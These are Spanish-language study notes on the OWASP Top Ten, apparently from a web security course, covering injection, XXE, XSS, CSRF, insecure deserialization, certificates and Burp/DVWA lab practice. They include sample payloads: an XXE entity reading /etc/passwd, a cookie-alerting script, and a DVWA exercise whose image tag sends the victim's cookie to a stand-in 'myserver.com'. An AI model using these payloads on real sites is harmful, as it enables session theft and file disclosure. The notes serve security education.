OWASP TOP TEN
A1-Inyection
*SQL Inyection
*Comand Inyection

A2-Broken Auth
Ataque a la aplicacion web

A3-Data Exposure->SSL, texto plano
Atacamos a usuarios por ej

A4-XXE(XML External Entities)
Problemas con los DTDs, cuando un miembro del dtd linkea a documentos externos, y lo reemplazo por el contenido del archivo que yo quiera
Puede pasar en cualquier aplicacion que acepte subir xml
<element foo any>
<entity xxe system 'file://etc/passwd'> o 'http://192.168.0.1/reset'

A5-Broken Acces Control
Generico, puede ser captchas, 2 factor auth por ej. pongo yo el nro de telefono para el segundo paso de auth

A6-Security Misconfiguration
El servidor esta malconfigurado y lista cosas de sus carpetas, 
cookies mal configuradas, que antes se usaban para los inicios de sesion, para mantenerla.
En la respuesta del http: Set cookie=auth;value=kjdns;
Flags: Secure(solamente en ssl) y HTTPonly(para que no se roben cookies con otros protocolos)
Mal configurado las counter security policies
Path que no estamos viendo y nos permite hacer un bypass como un directorio que no pide autenticacion

A7-XSS(Cross-Site Scripting)
*Persistente/Stored
Se guarda el input en una base de datos
Puedo atacar a usuarios que ingresen despues y ejecutar scripts que les roben datos
*Reflejado
No se guardan los datos, se muestran para la persona que esta entrando,
se puede armar la url y mandarla a alguien
*DOM
Aca nunca sale del browser la request, no se llega al servidor para que arme la respuesta,
generalmente es lo que va despues del ancor tag # (fragment)
Algunas librerias de galerias de imagenes lo utilizan, #foto1
Si el javascript usa ese dato para contruir algo en el DOM puedo utilizar eso
DOM(Document Object Model), arbol que mantiene todos los elementos html con sus atributos, etc.
Si se manipula el DOM se manipula el contenido HTML
En un campo de entrada que imprime datos, meto otros tags
"><script>Alert(document.cookie)</script> >>> Esto funciona si la cookie NO esta como HTTPOnly

CSRF?Cross Site Request Forgerin

estoy logueado en facebook www.facebook.com en un tab >> Esto tiene una cookie que define mi sesion
e otro tab se ejecuto un javascript www.attacker.com
¿Puedo ejecutar codigo que lea los mensajes de facebook?
las dos paginas son origenes diferentes cada uno con las cookies que seteo
origen: protocolo, dominio, puerto
Puedo controlar las cosas del origen que estoy
si puedo ejecutar XSS en un dominio que no es mio es un gran problema del dominio
Esto se conoce como SOP(Same Origin Policy) >> Esto lo implementa el browser
Si el browser es malo puede no implementar eso
Si yo tengo una compañia y necesito compartir cosas con otro dominio se invento CORS
Se implementan dominios que pueden hacer las request cruzadas
La request sale, lo que no se puede leer es la respuesta
Para la respuesta depende de como este configurado el servidor

A8-Insecure Deserialization
Serializacion: para mantener un estado de los atributos del objeto en ese momento,
el obj queda en json, xml, binario, y desps la libreria lo deserializa y crea una instancia del objeto con esos datos
Al deserializar, se debe crear una instancia, se llaman a inicializadores,
si por eje en el new estamos leyendo de un file y se lo pasa como atributo
si hago yo la serializacion puedo terminar leyendo el file que yo quiero
Por ejemplo si eso esta expuesto por algun servicio
Si puedo craftear una serializacion hay un problema.
Magic Methods: cada clase los tiene,
el codigo no sabe lo que esta deserializando hasta que lo deserializa y despues lo castea, en la data dice el tipo y los atributos
Si yo puedo pasar cualquier objeto se va a deserializar, despues falla el casteo, pero ya cree una instancia y ejecuto el inicializador
Puedo ejecutar codigo arbitrario en ese inicializador
NO DESERIALIZAR CUAlQUIER COSA, solo cosas que crafteamos nosotros
Se usa mucho en java, a veces en php
Hubo un bug en un CMS que deserializaba datos de una cookie desde php. 2014/15

EN SEGURIDAD TODOS LOS PROBLEMAS SURGEN DE LA CONFIANZA, YO TENGO QUE DESCONFIAR DE TODOS

A9-Using Components with Known Vulnerabilities
Usamos cosas que se saben que tienen un problema, cosas viejas, obsoletas, con vulnerabilidades
y ejecuto bugs conocidos

U10-Insufficient Logging & Monitoring
No saber que esta pasando

Certificados(SSL)
cada pagina tiene su certificado validado por una entidad que lo valida el browser
El certificado esta firmado por una CA, para saber que la CA es valida hay otra CA atras, hasta llegar a un root CA
El browser tiene cargado muchos root CA, y los certificados siguen una linea de CA y si llega a algun root CA el certificado es valido
Puedo deployar un root CA invalido en otro servidor y filtrar todo el trafico.
CA(Certifificate Authority)
Yo le compro mi certificado a un CA, si esta comprometido hay un problema.

Burp
Configurar proxy (Ver direccion)
Exportar certificado
Configurar proxy en Firefox
intercept off

mmc
Microsoft Management Console
Agregar certificados
certificados de confianza
importar el eque exportamos de burp
ESTO NO

importar el certificado en firefox

HSTS
certificado que el servidor manda al browser para confiar solo en ese

DVWA
XSS(Reflected)
<img src=x onerror=prompt(document.cookie)>
en el src ponemos la ip de un servidor nuestro y concatenamos la cookie
<img src=http://myserver.com/cookie="+document.cokie>
y analizamos las peticiones de nuestro servidor
